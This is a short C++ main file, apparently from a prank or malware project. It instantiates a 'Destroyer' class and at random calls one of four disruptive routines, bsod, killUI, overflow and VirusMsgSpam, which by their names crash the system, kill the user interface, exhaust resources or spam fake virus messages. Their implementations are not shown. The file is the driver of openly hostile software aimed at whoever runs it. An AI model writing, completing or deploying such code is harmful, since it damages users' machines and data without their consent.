#include "handler.h"

using namespace std;

int main() {
    Destroyer dest; //Initializing destroyer
    random_device randgenerator;
    mt19937 gen(randgenerator());
    uniform_int_distribution<int> dist(1, 4);    

    switch (dist(gen))
    {
    case 1:
        dest.bsod();
        break;
    
    case 2:
        dest.killUI();
        break;
    
    case 3:
        dest.overflow();
        break;

    case 4:
        dest.VirusMsgSpam();
        break;
    }
}